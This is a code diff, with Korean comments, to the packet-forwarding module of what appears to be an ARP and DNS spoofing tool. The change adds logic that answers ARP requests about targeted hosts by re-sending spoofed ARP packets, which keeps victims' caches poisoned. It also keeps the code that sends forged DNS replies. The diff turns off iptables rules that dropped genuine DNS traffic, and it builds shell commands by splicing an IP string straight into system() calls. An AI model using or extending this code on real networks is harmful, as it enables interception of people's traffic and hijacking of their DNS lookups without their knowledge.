@@ -8,13 +8,14 @@
 #include <netinet/ip.h>
 #include <netinet/udp.h>
 #include <net/ethernet.h>
+#include <netinet/if_ether.h>
 #include <chrono>
 #include <cstdlib>
 #include <sstream>
 #include <cstring>
 
 using namespace std;
-using namespace std::chrono;
+using namespace chrono;
 using namespace NetworkUtils;
 
 #define DNS_PORT 53
@@ -36,16 +37,21 @@ PacketForwarder::~PacketForwarder()
     stop();
 }
 
+// iptable 규칙 (패킷 DROP 안될 경우 이용)
 bool add_iptables_rules(const string& target_ip) 
 {
     system("iptables -F FORWARD");
     system("echo 1 > /proc/sys/net/ipv4/ip_forward");
+    // 서버로 보내는 패킷 차단
     string cmd1 = "iptables -A FORWARD -p udp -s " + target_ip + " --dport 53 -j DROP";
     int ret1 = system(cmd1.c_str());
+
+    // Target으로 보내는 패킷 차단
     string cmd2 = "iptables -A FORWARD -p udp -d " + target_ip + " --sport 53 -j DROP";
     int ret2 = system(cmd2.c_str());
     system("iptables -A FORWARD -j ACCEPT");
     return (ret1 == 0 && ret2 == 0);
+    // return (0);
 }
 
 void remove_iptables_rules() 
@@ -59,16 +65,17 @@ void PacketForwarder::start()
     if (running) return;
     running = true;
     
-    vector<string> target_ips;
-    for (const auto& target : spoofer->get_targets()) 
-    {
-        target_ips.push_back(target->get_ip_str());
-        if (add_iptables_rules(target->get_ip_str())) {
-            cout << "DNS 차단 규칙 적용됨 - 대상: " << target->get_ip_str() << "\n";
-        } else {
-            cerr << "DNS 차단 규칙 적용 실패 - 대상: " << target->get_ip_str() << "\n";
-        }
-    }
+    // iptable이 필요할 경우 아래 주석 해제
+    // vector<string> target_ips;
+    // for (const auto& target : spoofer->get_targets()) 
+    // {
+    //     target_ips.push_back(target->get_ip_str());
+    //     if (add_iptables_rules(target->get_ip_str())) {
+    //         cout << "DNS 차단 규칙 적용됨 - 대상: " << target->get_ip_str() << "\n";
+    //     } else {
+    //         cerr << "DNS 차단 규칙 적용 실패 - 대상: " << target->get_ip_str() << "\n";
+    //     }
+    // }
     
     forward_thread = make_unique<thread>(&PacketForwarder::forward_loop, this);
     cout << "패킷 포워딩 시스템 시작됨" << endl;
@@ -81,8 +88,11 @@ void PacketForwarder::stop()
     cv.notify_all();
     if (forward_thread && forward_thread->joinable())
         forward_thread->join();
-    remove_iptables_rules();
-    cout << "iptables 규칙 제거됨" << endl;
+
+    // iptable이 필요할 경우 해제로직도 추가로 주석 해제 필요
+    // remove_iptables_rules();
+    // cout << "iptables 규칙 제거됨" << endl;
+    
     recover_dns();
     cout << "패킷 포워딩 시스템 종료됨" << endl;
 }
@@ -145,7 +155,7 @@ bool PacketForwarder::handle_dns_packet(const uint8_t* packet, size_t packet_len
     size_t dns_data_len = packet_len - (sizeof(struct ether_header) + ip_header_len + sizeof(struct udphdr));
     
     // DNS 질문 섹션에서 도메인 이름 추출
-    std::string domain = dnsSpoofer->extract_domain_name(dns_data, dns_data_len);
+    string domain = dnsSpoofer->extract_domain_name(dns_data, dns_data_len);
     if (domain.empty())
         return false;
     
@@ -167,7 +177,7 @@ bool PacketForwarder::handle_dns_packet(const uint8_t* packet, size_t packet_len
         cout << "DNS 요청 감지: " << domain << "\n";
         uint8_t* packet_copy = new uint8_t[packet_len];
         memcpy(packet_copy, packet, packet_len);
-        std::thread([this, packet_copy, packet_len, domain]() {
+        thread([this, packet_copy, packet_len, domain]() {
             dnsSpoofer->send_spoof_response(handle, packet_copy, packet_len,
                                              spoofer->get_attacker_mac(),
                                              spoofer->get_gateway_ip(),
@@ -189,8 +199,27 @@ bool PacketForwarder::handle_dns_packet(const uint8_t* packet, size_t packet_len
 
 void PacketForwarder::handle_arp_packet(const uint8_t* packet, size_t packet_len) 
 {
-    // ARP 패킷은 그대로 포워딩 (필요시 ArpSpoofer 로직으로 확장)
-    forward_packet(packet, packet_len);
+    // ARP 패킷인지 확인
+    const struct ether_header* eth = reinterpret_cast<const struct ether_header*>(packet);
+    if (ntohs(eth->ether_type) != ETHERTYPE_ARP)
+        return;
+        
+    // ARP 헤더 파싱 (ether_arp 사용)
+    const struct ether_arp* arp = reinterpret_cast<const struct ether_arp*>(packet + sizeof(struct ether_header));
+    uint16_t op = ntohs(arp->ea_hdr.ar_op);
+    
+    // ARP 요청인 경우만 처리 (ARPOP_REQUEST 값은 1)
+    if (op == ARPOP_REQUEST) {
+        for (const auto& target : spoofer->get_targets()) {
+            // target->get_ip()에 해당하는 IP가 ARP의 SPA 또는 TPA에 포함되어 있다면
+            if (memcmp(arp->arp_spa, target->get_ip(), 4) == 0 ||
+                memcmp(arp->arp_tpa, target->get_ip(), 4) == 0) {
+                cout << "ARP 요청 감지: 대상 " << target->get_ip_str() 
+                     << " 관련 ARP 요청 발견. 스푸핑 패킷 재전송.\n";
+                spoofer->send_arp_spoofing_packet(target.get());
+            }
+        }
+    }
 }
 
 bool PacketForwarder::is_spoofed_packet(const uint8_t* packet, size_t packet_len) 
